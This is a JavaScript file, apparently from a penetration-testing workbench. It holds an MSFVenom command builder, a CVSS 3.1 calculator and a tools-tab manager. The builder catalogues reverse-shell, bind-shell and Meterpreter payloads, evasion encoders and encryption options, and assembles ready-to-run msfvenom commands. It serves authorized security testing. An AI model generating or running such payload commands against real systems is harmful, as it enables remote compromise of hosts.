/**
 * MSFVenom Builder - Payload command generator
 */
const MSFVenomBuilder = {
    state: {
        platform: 'Windows',
        category: 'Meterpreter',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'exe',
        arch: '',
        encoder: '',
        iterations: 1,
        badChars: '',
        lhost: '',
        lport: '4444',
        rhost: '',
        rport: '4444',
        cmd: '',
        exitfunc: 'process',
        outputFile: '',
        encrypt: '',
        encryptKey: '',
        encryptIv: ''
    },

    PAYLOADS: {
        'Windows': {
            'Meterpreter': [
                { value: 'windows/meterpreter/reverse_tcp', label: 'Reverse TCP (x86)', type: 'reverse', arch: 'x86' },
                { value: 'windows/meterpreter/reverse_https', label: 'Reverse HTTPS (x86)', type: 'reverse', arch: 'x86' },
                { value: 'windows/x64/meterpreter/reverse_tcp', label: 'Reverse TCP (x64)', type: 'reverse', arch: 'x64' },
                { value: 'windows/x64/meterpreter/reverse_https', label: 'Reverse HTTPS (x64)', type: 'reverse', arch: 'x64' },
                { value: 'windows/meterpreter/bind_tcp', label: 'Bind TCP (x86)', type: 'bind', arch: 'x86' },
                { value: 'windows/x64/meterpreter/bind_tcp', label: 'Bind TCP (x64)', type: 'bind', arch: 'x64' }
            ],
            'Shell': [
                { value: 'windows/shell_reverse_tcp', label: 'Reverse TCP (x86)', type: 'reverse', arch: 'x86' },
                { value: 'windows/x64/shell_reverse_tcp', label: 'Reverse TCP (x64)', type: 'reverse', arch: 'x64' },
                { value: 'windows/shell/bind_tcp', label: 'Bind TCP (x86)', type: 'bind', arch: 'x86' },
                { value: 'windows/x64/shell/bind_tcp', label: 'Bind TCP (x64)', type: 'bind', arch: 'x64' }
            ],
            'Exec': [
                { value: 'windows/exec', label: 'Execute Command (x86)', type: 'exec', arch: 'x86' },
                { value: 'windows/x64/exec', label: 'Execute Command (x64)', type: 'exec', arch: 'x64' }
            ]
        },
        'Linux': {
            'Meterpreter': [
                { value: 'linux/x86/meterpreter/reverse_tcp', label: 'Reverse TCP (x86)', type: 'reverse', arch: 'x86' },
                { value: 'linux/x64/meterpreter/reverse_tcp', label: 'Reverse TCP (x64)', type: 'reverse', arch: 'x64' },
                { value: 'linux/x86/meterpreter/bind_tcp', label: 'Bind TCP (x86)', type: 'bind', arch: 'x86' },
                { value: 'linux/x64/meterpreter/bind_tcp', label: 'Bind TCP (x64)', type: 'bind', arch: 'x64' }
            ],
            'Shell': [
                { value: 'linux/x86/shell_reverse_tcp', label: 'Reverse TCP (x86)', type: 'reverse', arch: 'x86' },
                { value: 'linux/x64/shell_reverse_tcp', label: 'Reverse TCP (x64)', type: 'reverse', arch: 'x64' },
                { value: 'linux/x86/shell/bind_tcp', label: 'Bind TCP (x86)', type: 'bind', arch: 'x86' },
                { value: 'linux/x64/shell/bind_tcp', label: 'Bind TCP (x64)', type: 'bind', arch: 'x64' }
            ]
        },
        'macOS': {
            'Meterpreter': [
                { value: 'osx/x64/meterpreter/reverse_tcp', label: 'Reverse TCP (x64)', type: 'reverse', arch: 'x64' },
                { value: 'osx/x64/meterpreter/reverse_https', label: 'Reverse HTTPS (x64)', type: 'reverse', arch: 'x64' },
                { value: 'osx/x64/meterpreter/bind_tcp', label: 'Bind TCP (x64)', type: 'bind', arch: 'x64' }
            ],
            'Shell': [
                { value: 'osx/x64/shell_reverse_tcp', label: 'Reverse TCP (x64)', type: 'reverse', arch: 'x64' },
                { value: 'osx/x64/shell_bind_tcp', label: 'Bind TCP (x64)', type: 'bind', arch: 'x64' }
            ]
        },
        'Web': {
            'PHP': [
                { value: 'php/meterpreter/reverse_tcp', label: 'Meterpreter Reverse TCP', type: 'reverse' },
                { value: 'php/reverse_php', label: 'PHP Reverse Shell', type: 'reverse' },
                { value: 'php/bind_php', label: 'PHP Bind Shell', type: 'bind' }
            ],
            'Java': [
                { value: 'java/meterpreter/reverse_tcp', label: 'Meterpreter Reverse TCP', type: 'reverse' },
                { value: 'java/shell_reverse_tcp', label: 'Shell Reverse TCP', type: 'reverse' },
                { value: 'java/jsp_shell_reverse_tcp', label: 'JSP Shell Reverse TCP', type: 'reverse' }
            ],
            'Python': [
                { value: 'python/meterpreter/reverse_tcp', label: 'Meterpreter Reverse TCP', type: 'reverse' },
                { value: 'python/shell_reverse_tcp', label: 'Shell Reverse TCP', type: 'reverse' }
            ]
        },
        'Android': {
            'Meterpreter': [
                { value: 'android/meterpreter/reverse_tcp', label: 'Meterpreter Reverse TCP', type: 'reverse' },
                { value: 'android/meterpreter/reverse_https', label: 'Meterpreter Reverse HTTPS', type: 'reverse' },
                { value: 'android/meterpreter_reverse_tcp', label: 'Meterpreter Reverse TCP (Stageless)', type: 'reverse' }
            ]
        }
    },

    FORMATS: {
        'Executable': [
            { value: 'exe', label: 'Windows EXE' },
            { value: 'exe-small', label: 'Windows EXE (small)' },
            { value: 'dll', label: 'Windows DLL' },
            { value: 'msi', label: 'Windows MSI' },
            { value: 'elf', label: 'Linux ELF' },
            { value: 'elf-so', label: 'Linux Shared Object' },
            { value: 'macho', label: 'macOS Mach-O' },
            { value: 'jar', label: 'Java JAR' },
            { value: 'war', label: 'Java WAR' },
            { value: 'apk', label: 'Android APK' }
        ],
        'Script': [
            { value: 'asp', label: 'ASP' },
            { value: 'aspx', label: 'ASPX' },
            { value: 'jsp', label: 'JSP' },
            { value: 'psh', label: 'PowerShell' },
            { value: 'psh-cmd', label: 'PowerShell (cmd)' },
            { value: 'python', label: 'Python' },
            { value: 'bash', label: 'Bash' }
        ],
        'Shellcode': [
            { value: 'raw', label: 'Raw Binary' },
            { value: 'c', label: 'C Array' },
            { value: 'csharp', label: 'C# Array' },
            { value: 'hex', label: 'Hex String' },
            { value: 'powershell', label: 'PowerShell Base64' },
            { value: 'vbscript', label: 'VBScript' }
        ]
    },

    ENCODERS: [
        { value: '', label: 'None (no encoding)' },
        { value: 'x86/shikata_ga_nai', label: 'Shikata Ga Nai (x86) - Polymorphic' },
        { value: 'x64/xor', label: 'XOR (x64)' },
        { value: 'x86/xor', label: 'XOR (x86)' },
        { value: 'x86/alpha_mixed', label: 'Alpha Mixed (x86)' },
        { value: 'x86/alpha_upper', label: 'Alpha Upper (x86)' },
        { value: 'x86/countdown', label: 'Countdown (x86)' },
        { value: 'x86/fnstenv_mov', label: 'Fnstenv Mov (x86)' },
        { value: 'x86/jmp_call_additive', label: 'JMP Call Additive (x86)' },
        { value: 'x64/zutto_dekiru', label: 'Zutto Dekiru (x64)' },
        { value: 'php/base64', label: 'Base64 (PHP)' },
        { value: 'cmd/powershell_base64', label: 'PowerShell Base64' }
    ],

    ENCRYPTION: [
        { value: '', label: 'None' },
        { value: 'xor', label: 'XOR' },
        { value: 'aes256', label: 'AES-256' },
        { value: 'rc4', label: 'RC4' },
        { value: 'base64', label: 'Base64' }
    ],

    init() {
        this.setupEventListeners();
        this.updatePreview();
    },

    setupEventListeners() {
        // Platform change
        const platformSelect = document.getElementById('msf-platform');
        if (platformSelect) {
            platformSelect.addEventListener('change', (e) => {
                this.state.platform = e.target.value;
                this.updateCategoryOptions();
                this.updatePayloadOptions();
                this.updatePreview();
            });
        }

        // Category change
        const categorySelect = document.getElementById('msf-category');
        if (categorySelect) {
            categorySelect.addEventListener('change', (e) => {
                this.state.category = e.target.value;
                this.updatePayloadOptions();
                this.updatePreview();
            });
        }

        // Payload change
        const payloadSelect = document.getElementById('msf-payload');
        if (payloadSelect) {
            payloadSelect.addEventListener('change', (e) => {
                this.state.payload = e.target.value;
                this.updateFieldVisibility();
                this.updatePreview();
            });
        }

        // Format change
        const formatSelect = document.getElementById('msf-format');
        if (formatSelect) {
            formatSelect.addEventListener('change', (e) => {
                this.state.format = e.target.value;
                this.updatePreview();
            });
        }

        // All other inputs
        const inputs = ['msf-lhost', 'msf-lport', 'msf-rhost', 'msf-rport', 'msf-cmd',
                        'msf-arch', 'msf-exitfunc', 'msf-output', 'msf-encoder',
                        'msf-iterations', 'msf-badchars', 'msf-encrypt',
                        'msf-encrypt-key', 'msf-encrypt-iv'];

        inputs.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                el.addEventListener('input', (e) => {
                    const key = id.replace('msf-', '').replace(/-/g, '');
                    // Map input IDs to state keys
                    const keyMap = {
                        'lhost': 'lhost', 'lport': 'lport', 'rhost': 'rhost', 'rport': 'rport',
                        'cmd': 'cmd', 'arch': 'arch', 'exitfunc': 'exitfunc', 'output': 'outputFile',
                        'encoder': 'encoder', 'iterations': 'iterations', 'badchars': 'badChars',
                        'encrypt': 'encrypt', 'encryptkey': 'encryptKey', 'encryptiv': 'encryptIv'
                    };
                    const stateKey = keyMap[key] || key;
                    this.state[stateKey] = e.target.value;
                    this.updatePreview();

                    // Show/hide encryption key fields
                    if (id === 'msf-encrypt') {
                        this.updateEncryptionFields();
                    }
                });
            }
        });
    },

    updateCategoryOptions() {
        const categorySelect = document.getElementById('msf-category');
        if (!categorySelect) return;

        const platformPayloads = this.PAYLOADS[this.state.platform] || {};
        const categories = Object.keys(platformPayloads);

        categorySelect.innerHTML = categories.map(cat =>
            `<option value="${cat}" ${cat === this.state.category ? 'selected' : ''}>${cat}</option>`
        ).join('');

        // Update state if current category doesn't exist
        if (!categories.includes(this.state.category)) {
            this.state.category = categories[0] || '';
            this.updatePayloadOptions();
        }
    },

    updatePayloadOptions() {
        const payloadSelect = document.getElementById('msf-payload');
        if (!payloadSelect) return;

        const platformPayloads = this.PAYLOADS[this.state.platform] || {};
        const categoryPayloads = platformPayloads[this.state.category] || [];

        payloadSelect.innerHTML = categoryPayloads.map(p =>
            `<option value="${p.value}" ${p.value === this.state.payload ? 'selected' : ''}>${p.label}</option>`
        ).join('');

        // Update state if current payload doesn't exist
        if (!categoryPayloads.find(p => p.value === this.state.payload)) {
            this.state.payload = categoryPayloads[0]?.value || '';
        }

        this.updateFieldVisibility();
    },

    updateFieldVisibility() {
        const payload = this.getCurrentPayload();
        const type = payload?.type || 'reverse';

        const lhostRow = document.getElementById('msf-lhost-row');
        const rhostRow = document.getElementById('msf-rhost-row');
        const cmdRow = document.getElementById('msf-cmd-row');

        if (lhostRow) lhostRow.style.display = (type === 'reverse') ? 'flex' : 'none';
        if (rhostRow) rhostRow.style.display = (type === 'bind') ? 'flex' : 'none';
        if (cmdRow) cmdRow.style.display = (type === 'exec') ? 'block' : 'none';
    },

    updateEncryptionFields() {
        const encryptKeyRow = document.getElementById('msf-encrypt-keys');
        if (encryptKeyRow) {
            encryptKeyRow.style.display = this.state.encrypt ? 'flex' : 'none';
        }
    },

    getCurrentPayload() {
        const platformPayloads = this.PAYLOADS[this.state.platform] || {};
        const categoryPayloads = platformPayloads[this.state.category] || [];
        return categoryPayloads.find(p => p.value === this.state.payload);
    },

    generateCommand() {
        const parts = ['msfvenom'];
        const payload = this.getCurrentPayload();
        const type = payload?.type || 'reverse';

        // Payload
        if (this.state.payload) {
            parts.push(`-p ${this.state.payload}`);
        }

        // Connection params based on payload type
        if (type === 'reverse') {
            if (this.state.lhost) parts.push(`LHOST=${this.state.lhost}`);
            if (this.state.lport) parts.push(`LPORT=${this.state.lport}`);
        } else if (type === 'bind') {
            if (this.state.rhost) parts.push(`RHOST=${this.state.rhost}`);
            if (this.state.rport) parts.push(`RPORT=${this.state.rport}`);
        } else if (type === 'exec') {
            if (this.state.cmd) parts.push(`CMD="${this.state.cmd}"`);
        }

        // Exit function
        if (this.state.exitfunc && this.state.exitfunc !== 'process') {
            parts.push(`EXITFUNC=${this.state.exitfunc}`);
        }

        // Format
        if (this.state.format) {
            parts.push(`-f ${this.state.format}`);
        }

        // Architecture
        if (this.state.arch) {
            parts.push(`-a ${this.state.arch}`);
        }

        // Encoder
        if (this.state.encoder) {
            parts.push(`-e ${this.state.encoder}`);
            if (this.state.iterations > 1) {
                parts.push(`-i ${this.state.iterations}`);
            }
        }

        // Bad chars
        if (this.state.badChars) {
            parts.push(`-b "${this.state.badChars}"`);
        }

        // Encryption
        if (this.state.encrypt) {
            parts.push(`--encrypt ${this.state.encrypt}`);
            if (this.state.encryptKey) {
                parts.push(`--encrypt-key "${this.state.encryptKey}"`);
            }
            if (this.state.encryptIv && this.state.encrypt === 'aes256') {
                parts.push(`--encrypt-iv "${this.state.encryptIv}"`);
            }
        }

        // Output file
        if (this.state.outputFile) {
            parts.push(`-o ${this.state.outputFile}`);
        }

        return parts.join(' ');
    },

    updatePreview() {
        const previewEl = document.getElementById('msf-command-preview');
        if (previewEl) {
            previewEl.textContent = this.generateCommand();
        }
    },

    toggleAdvanced() {
        const advancedSection = document.getElementById('msf-advanced');
        const toggleBtn = document.querySelector('.advanced-toggle');
        if (advancedSection && toggleBtn) {
            const isVisible = advancedSection.style.display !== 'none';
            advancedSection.style.display = isVisible ? 'none' : 'block';
            toggleBtn.querySelector('.toggle-icon').textContent = isVisible ? '+' : '-';
        }
    },

    async copyToClipboard() {
        const command = this.generateCommand();
        try {
            await navigator.clipboard.writeText(command);
            showToast('Command copied to clipboard', 'success');
        } catch (err) {
            console.error('Failed to copy:', err);
            showToast('Failed to copy to clipboard', 'error');
        }
    },

    async saveToCommands() {
        const command = this.generateCommandWithVariables();
        const payload = this.getCurrentPayload();
        const type = payload?.type || 'reverse';

        const variables = [];
        if (type === 'reverse') {
            if (this.state.lhost) variables.push({ name: 'LHOST', description: 'Your IP address', default: this.state.lhost });
            if (this.state.lport) variables.push({ name: 'LPORT', description: 'Listening port', default: this.state.lport });
        } else if (type === 'bind') {
            if (this.state.rhost) variables.push({ name: 'RHOST', description: 'Target IP address', default: this.state.rhost });
            if (this.state.rport) variables.push({ name: 'RPORT', description: 'Target port', default: this.state.rport });
        }

        const commandData = {
            category: 'Exploitation',
            name: this.generateCommandName(),
            command: command,
            description: `MSFVenom payload: ${this.state.payload} (${this.state.format})`,
            variables: JSON.stringify(variables)
        };

        try {
            const result = await API.commands.create(commandData);
            showToast('Command saved to library', 'success');
        } catch (error) {
            console.error('Failed to save command:', error);
            showToast('Failed to save command: ' + (error.message || 'Unknown error'), 'error');
        }
    },

    generateCommandWithVariables() {
        let command = this.generateCommand();
        const payload = this.getCurrentPayload();
        const type = payload?.type || 'reverse';

        if (type === 'reverse') {
            if (this.state.lhost) command = command.replace(`LHOST=${this.state.lhost}`, 'LHOST={LHOST}');
            if (this.state.lport) command = command.replace(`LPORT=${this.state.lport}`, 'LPORT={LPORT}');
        } else if (type === 'bind') {
            if (this.state.rhost) command = command.replace(`RHOST=${this.state.rhost}`, 'RHOST={RHOST}');
            if (this.state.rport) command = command.replace(`RPORT=${this.state.rport}`, 'RPORT={RPORT}');
        }

        return command;
    },

    generateCommandName() {
        const parts = this.state.payload.split('/');
        const platform = parts[0].charAt(0).toUpperCase() + parts[0].slice(1);
        const payloadType = parts[parts.length - 1].replace(/_/g, ' ');
        return `${platform} ${payloadType} (${this.state.format})`;
    }
};

// Make MSFVenomBuilder available globally
window.MSFVenomBuilder = MSFVenomBuilder;

/**
 * CVSS 3.1 Calculator - Base Score Calculator
 */
const CVSSCalculator = {
    state: {
        AV: null,  // Attack Vector: N, A, L, P
        AC: null,  // Attack Complexity: L, H
        PR: null,  // Privileges Required: N, L, H
        UI: null,  // User Interaction: N, R
        S: null,   // Scope: U, C
        C: null,   // Confidentiality: N, L, H
        I: null,   // Integrity: N, L, H
        A: null    // Availability: N, L, H
    },

    // CVSS 3.1 metric definitions with labels and descriptions
    METRICS: {
        AV: {
            name: 'Attack Vector',
            description: 'How the vulnerability can be exploited',
            options: [
                { value: 'N', label: 'Network', description: 'Exploitable remotely over the network' },
                { value: 'A', label: 'Adjacent', description: 'Requires access to local network' },
                { value: 'L', label: 'Local', description: 'Requires local access to the system' },
                { value: 'P', label: 'Physical', description: 'Requires physical access to the device' }
            ]
        },
        AC: {
            name: 'Attack Complexity',
            description: 'Conditions beyond attacker control required to exploit',
            options: [
                { value: 'L', label: 'Low', description: 'No specialized conditions required' },
                { value: 'H', label: 'High', description: 'Specialized conditions required' }
            ]
        },
        PR: {
            name: 'Privileges Required',
            description: 'Level of privileges needed to exploit',
            options: [
                { value: 'N', label: 'None', description: 'No privileges required' },
                { value: 'L', label: 'Low', description: 'Basic user privileges required' },
                { value: 'H', label: 'High', description: 'Administrative privileges required' }
            ]
        },
        UI: {
            name: 'User Interaction',
            description: 'Whether user interaction is required',
            options: [
                { value: 'N', label: 'None', description: 'No user interaction required' },
                { value: 'R', label: 'Required', description: 'User must perform action' }
            ]
        },
        S: {
            name: 'Scope',
            description: 'Whether impact extends beyond the vulnerable component',
            options: [
                { value: 'U', label: 'Unchanged', description: 'Impact limited to vulnerable component' },
                { value: 'C', label: 'Changed', description: 'Impact extends to other components' }
            ]
        },
        C: {
            name: 'Confidentiality',
            description: 'Impact on information disclosure',
            options: [
                { value: 'H', label: 'High', description: 'Total loss of confidentiality' },
                { value: 'L', label: 'Low', description: 'Some loss of confidentiality' },
                { value: 'N', label: 'None', description: 'No impact on confidentiality' }
            ]
        },
        I: {
            name: 'Integrity',
            description: 'Impact on data modification',
            options: [
                { value: 'H', label: 'High', description: 'Total loss of integrity' },
                { value: 'L', label: 'Low', description: 'Some loss of integrity' },
                { value: 'N', label: 'None', description: 'No impact on integrity' }
            ]
        },
        A: {
            name: 'Availability',
            description: 'Impact on system availability',
            options: [
                { value: 'H', label: 'High', description: 'Total loss of availability' },
                { value: 'L', label: 'Low', description: 'Reduced availability' },
                { value: 'N', label: 'None', description: 'No impact on availability' }
            ]
        }
    },

    // CVSS 3.1 weight values
    WEIGHTS: {
        AV: { N: 0.85, A: 0.62, L: 0.55, P: 0.2 },
        AC: { L: 0.77, H: 0.44 },
        PR: {
            U: { N: 0.85, L: 0.62, H: 0.27 },  // Scope Unchanged
            C: { N: 0.85, L: 0.68, H: 0.50 }   // Scope Changed
        },
        UI: { N: 0.85, R: 0.62 },
        C: { H: 0.56, L: 0.22, N: 0 },
        I: { H: 0.56, L: 0.22, N: 0 },
        A: { H: 0.56, L: 0.22, N: 0 }
    },

    init() {
        this.setupEventListeners();
        this.updateDisplay();
    },

    setupEventListeners() {
        // Event listeners are attached via onclick in the rendered HTML
    },

    selectMetric(metric, value) {
        this.state[metric] = value;

        // Update button states
        const buttons = document.querySelectorAll(`[data-metric="${metric}"]`);
        buttons.forEach(btn => {
            btn.classList.toggle('selected', btn.dataset.value === value);
        });

        this.updateDisplay();
    },

    calculate() {
        // Check if all metrics are selected
        const allSelected = Object.values(this.state).every(v => v !== null);
        if (!allSelected) {
            return null;
        }

        const { AV, AC, PR, UI, S, C, I, A } = this.state;

        // Get weights
        const avWeight = this.WEIGHTS.AV[AV];
        const acWeight = this.WEIGHTS.AC[AC];
        const prWeight = this.WEIGHTS.PR[S][PR]; // PR weight depends on Scope
        const uiWeight = this.WEIGHTS.UI[UI];

        const cWeight = this.WEIGHTS.C[C];
        const iWeight = this.WEIGHTS.I[I];
        const aWeight = this.WEIGHTS.A[A];

        // Calculate Exploitability
        const exploitability = 8.22 * avWeight * acWeight * prWeight * uiWeight;

        // Calculate Impact Sub Score (ISS)
        const iss = 1 - ((1 - cWeight) * (1 - iWeight) * (1 - aWeight));

        // Calculate Impact based on Scope
        let impact;
        if (S === 'U') {
            impact = 6.42 * iss;
        } else {
            impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow((iss - 0.02), 15);
        }

        // Calculate Base Score
        let baseScore;
        if (impact <= 0) {
            baseScore = 0;
        } else if (S === 'U') {
            baseScore = this.roundUp(Math.min(impact + exploitability, 10));
        } else {
            baseScore = this.roundUp(Math.min(1.08 * (impact + exploitability), 10));
        }

        return baseScore;
    },

    // CVSS 3.1 roundup function (round up to 1 decimal place)
    roundUp(value) {
        return Math.ceil(value * 10) / 10;
    },

    getSeverityRating(score) {
        if (score === null) return { rating: 'None', class: 'none' };
        if (score === 0) return { rating: 'None', class: 'none' };
        if (score <= 3.9) return { rating: 'Low', class: 'low' };
        if (score <= 6.9) return { rating: 'Medium', class: 'medium' };
        if (score <= 8.9) return { rating: 'High', class: 'high' };
        return { rating: 'Critical', class: 'critical' };
    },

    getVectorString() {
        const parts = ['CVSS:3.1'];
        const metricOrder = ['AV', 'AC', 'PR', 'UI', 'S', 'C', 'I', 'A'];

        for (const metric of metricOrder) {
            if (this.state[metric] !== null) {
                parts.push(`${metric}:${this.state[metric]}`);
            }
        }

        if (parts.length === 1) {
            return 'Select all metrics to generate vector string';
        }

        return parts.join('/');
    },

    updateDisplay() {
        const score = this.calculate();
        const severity = this.getSeverityRating(score);
        const vectorString = this.getVectorString();

        // Update score display
        const scoreEl = document.getElementById('cvss-score-value');
        if (scoreEl) {
            scoreEl.textContent = score !== null ? score.toFixed(1) : '--';
            scoreEl.className = `cvss-score-value ${severity.class}`;
        }

        // Update severity badge
        const badgeEl = document.getElementById('cvss-severity-badge');
        if (badgeEl) {
            badgeEl.textContent = severity.rating;
            badgeEl.className = `cvss-severity-badge ${severity.class}`;
        }

        // Update vector string
        const vectorEl = document.getElementById('cvss-vector-string');
        if (vectorEl) {
            vectorEl.textContent = vectorString;
        }

        // Update copy button state
        const copyBtn = document.getElementById('cvss-copy-btn');
        if (copyBtn) {
            copyBtn.disabled = score === null;
        }
    },

    async copyVector() {
        const vectorString = this.getVectorString();
        if (vectorString.startsWith('Select')) {
            showToast('Please select all metrics first', 'warning');
            return;
        }

        try {
            await navigator.clipboard.writeText(vectorString);
            showToast('Vector string copied to clipboard', 'success');
        } catch (err) {
            console.error('Failed to copy:', err);
            showToast('Failed to copy to clipboard', 'error');
        }
    },

    reset() {
        // Reset all state
        Object.keys(this.state).forEach(key => {
            this.state[key] = null;
        });

        // Remove all selected states from buttons
        document.querySelectorAll('.cvss-metric-btn.selected').forEach(btn => {
            btn.classList.remove('selected');
        });

        this.updateDisplay();
    },

    render() {
        const exploitabilityMetrics = ['AV', 'AC', 'PR', 'UI', 'S'];
        const impactMetrics = ['C', 'I', 'A'];

        const renderMetricGroup = (metricKey) => {
            const metric = this.METRICS[metricKey];
            return `
                <div class="cvss-metric-group">
                    <div class="cvss-metric-header">
                        <span class="cvss-metric-name">${metric.name}</span>
                        <span class="cvss-metric-key">${metricKey}</span>
                    </div>
                    <div class="cvss-metric-desc">${metric.description}</div>
                    <div class="cvss-metric-options">
                        ${metric.options.map(opt => `
                            <button class="cvss-metric-btn ${this.state[metricKey] === opt.value ? 'selected' : ''}"
                                    data-metric="${metricKey}"
                                    data-value="${opt.value}"
                                    onclick="CVSSCalculator.selectMetric('${metricKey}', '${opt.value}')"
                                    title="${opt.description}">
                                ${opt.label}
                            </button>
                        `).join('')}
                    </div>
                </div>
            `;
        };

        return `
            <div class="cvss-calculator">
                <div class="cvss-header">
                    <h3>CVSS 3.1 Calculator</h3>
                    <p>Calculate Common Vulnerability Scoring System base scores</p>
                </div>

                <div class="cvss-container">
                    <div class="cvss-form">
                        <div class="cvss-section">
                            <h4>Exploitability Metrics</h4>
                            ${exploitabilityMetrics.map(m => renderMetricGroup(m)).join('')}
                        </div>

                        <div class="cvss-section">
                            <h4>Impact Metrics</h4>
                            ${impactMetrics.map(m => renderMetricGroup(m)).join('')}
                        </div>
                    </div>

                    <div class="cvss-preview">
                        <div class="cvss-score-display">
                            <div class="cvss-score-label">Base Score</div>
                            <div id="cvss-score-value" class="cvss-score-value none">--</div>
                            <div id="cvss-severity-badge" class="cvss-severity-badge none">None</div>
                        </div>

                        <div class="cvss-vector-display">
                            <div class="cvss-vector-label">Vector String</div>
                            <code id="cvss-vector-string" class="cvss-vector-string">Select all metrics to generate vector string</code>
                        </div>

                        <div class="cvss-actions">
                            <button id="cvss-copy-btn" class="btn btn-primary" onclick="CVSSCalculator.copyVector()" disabled>
                                Copy Vector String
                            </button>
                            <button class="btn btn-secondary" onclick="CVSSCalculator.reset()">
                                Reset
                            </button>
                        </div>

                        <div class="cvss-severity-scale">
                            <h5>Severity Scale</h5>
                            <div class="severity-scale-items">
                                <div class="severity-scale-item">
                                    <span class="severity-dot none"></span>
                                    <span>None (0.0)</span>
                                </div>
                                <div class="severity-scale-item">
                                    <span class="severity-dot low"></span>
                                    <span>Low (0.1 - 3.9)</span>
                                </div>
                                <div class="severity-scale-item">
                                    <span class="severity-dot medium"></span>
                                    <span>Medium (4.0 - 6.9)</span>
                                </div>
                                <div class="severity-scale-item">
                                    <span class="severity-dot high"></span>
                                    <span>High (7.0 - 8.9)</span>
                                </div>
                                <div class="severity-scale-item">
                                    <span class="severity-dot critical"></span>
                                    <span>Critical (9.0 - 10.0)</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }
};

// Make CVSSCalculator available globally
window.CVSSCalculator = CVSSCalculator;

/**
 * PTVault Tools Manager
 * Handles tools section functionality including CyberChef integration
 */
const ToolsManager = {
    initialized: false,
    cyberchefStatus: null,
    activeTab: 'cyberchef',

    /**
     * Initialize tools manager
     */
    async init() {
        if (this.initialized) return;

        try {
            await this.loadCyberChefStatus();
            this.renderToolsSection();
            this.setupEventListeners();
            this.initialized = true;
        } catch (error) {
            console.error('Failed to initialize ToolsManager:', error);
            showToast('Failed to load tools', 'error');
        }
    },

    /**
     * Load CyberChef installation status
     */
    async loadCyberChefStatus() {
        try {
            this.cyberchefStatus = await API.admin.getCyberChefStatus();
        } catch (error) {
            console.error('Failed to load CyberChef status:', error);
            this.cyberchefStatus = { installed: false };
        }
    },

    /**
     * Render the tools section content
     */
    renderToolsSection() {
        const container = document.getElementById('section-tools');
        if (!container) return;

        container.innerHTML = `
            <div class="tools-page">
                <div class="tools-tabs">
                    <button class="tools-tab ${this.activeTab === 'cyberchef' ? 'active' : ''}"
                            data-tool="cyberchef" onclick="ToolsManager.switchTool('cyberchef')">
                        <span class="tool-icon"><i data-lucide="chef-hat"></i></span>
                        <span>CyberChef</span>
                    </button>
                    <button class="tools-tab ${this.activeTab === 'command' ? 'active' : ''}"
                            data-tool="command" onclick="ToolsManager.switchTool('command')">
                        <span class="tool-icon"><i data-lucide="terminal"></i></span>
                        <span>Command</span>
                    </button>
                    <button class="tools-tab ${this.activeTab === 'calculators' ? 'active' : ''}"
                            data-tool="calculators" onclick="ToolsManager.switchTool('calculators')">
                        <span class="tool-icon"><i data-lucide="calculator"></i></span>
                        <span>Calculators</span>
                    </button>
                    <button class="tools-tab ${this.activeTab === 'decoders' ? 'active' : ''}"
                            data-tool="decoders" onclick="ToolsManager.switchTool('decoders')">
                        <span class="tool-icon"><i data-lucide="lock-open"></i></span>
                        <span>Decoders</span>
                    </button>
                    <button class="tools-tab ${this.activeTab === 'attackmaps' ? 'active' : ''}"
                            data-tool="attackmaps" onclick="ToolsManager.switchTool('attackmaps')">
                        <span class="tool-icon"><i data-lucide="map"></i></span>
                        <span>Attack Maps</span>
                    </button>
                    <button class="tools-tab ${this.activeTab === 'data' ? 'active' : ''}"
                            data-tool="data" onclick="ToolsManager.switchTool('data')">
                        <span class="tool-icon"><i data-lucide="database"></i></span>
                        <span>Data</span>
                    </button>
                </div>
                <div class="tools-content" id="toolsContent">
                    ${this.renderActiveTabContent()}
                </div>
            </div>
        `;
    },

    /**
     * Render content for the active tab
     */
    renderActiveTabContent() {
        switch (this.activeTab) {
            case 'cyberchef':
                return this.renderCyberChefContent();
            case 'command':
                setTimeout(() => CommandHubManager.init(), 0);
                return CommandHubManager.render();
            case 'calculators':
                setTimeout(() => CalculatorsManager.init(), 0);
                return CalculatorsManager.render();
            case 'decoders':
                setTimeout(() => DecodersManager.init(), 0);
                return DecodersManager.render();
            case 'attackmaps':
                return this.renderAttackMapsContent();
            case 'data':
                setTimeout(() => updateImportButtonState && updateImportButtonState(), 0);
                return this.renderDataContent();
            default:
                return this.renderCyberChefContent();
        }
    },

    /**
     * Render the Data sub-tab — Import / Export / Restore for the active engagement.
     */
    renderDataContent() {
        return `
            <div class="tools-data-page">
                <div class="tools-data-header">
                    <h3>Engagement Data</h3>
                    <p class="tools-data-subtitle">
                        Bring tool output into the active engagement, export for reporting,
                        or restore from a JSON backup.
                    </p>
                </div>
                <div class="tools-data-grid">
                    <button class="tools-data-action" id="importToolBtn" onclick="dataImportClicked()" title="Import tool output (Nmap, Nessus, Burp, …)">
                        <span class="tools-data-icon">↑</span>
                        <span class="tools-data-label">Import</span>
                        <span class="tools-data-hint">Parse Nmap, Nessus, Burp, ZAP, Nuclei, BloodHound, and more.</span>
                    </button>
                    <button class="tools-data-action" onclick="dataExportClicked()" title="Export this engagement to JSON / Markdown / template">
                        <span class="tools-data-icon">↓</span>
                        <span class="tools-data-label">Export</span>
                        <span class="tools-data-hint">JSON, Markdown, or a report template.</span>
                    </button>
                    <button class="tools-data-action" onclick="dataRestoreClicked()" title="Restore a previously exported JSON backup">
                        <span class="tools-data-icon">⟲</span>
                        <span class="tools-data-label">Restore</span>
                        <span class="tools-data-hint">Re-import a JSON backup of an engagement.</span>
                    </button>
                </div>
            </div>
        `;
    },

    /**
     * Render Commands content (embedded version of the Commands section)
     */
    renderCommandsContent() {
        // Initialize CommandManager after rendering
        setTimeout(() => {
            if (typeof CommandManager !== 'undefined') {
                CommandManager.init();
            }
        }, 0);

        return `
            <div class="commands-page embedded">
                <!-- Categories Sidebar -->
                <aside class="commands-sidebar">
                    <div class="commands-sidebar-header">
                        <h3>Categories</h3>
                    </div>
                    <div id="commandCategories" class="category-list">
                        <div class="loading">Loading...</div>
                    </div>
                    <div class="commands-sidebar-footer">
                        <button class="btn btn-primary btn-block" onclick="CommandManager.openAddModal()">
                            + Add Command
                        </button>
                    </div>
                </aside>

                <!-- Commands Main Content -->
                <main class="commands-main">
                    <div class="commands-header">
                        <div class="commands-search">
                            <i data-lucide="search" class="search-icon"></i>
                            <input type="text" id="commandSearch" placeholder="Search commands..." autocomplete="off">
                        </div>
                        <div class="commands-header-actions">
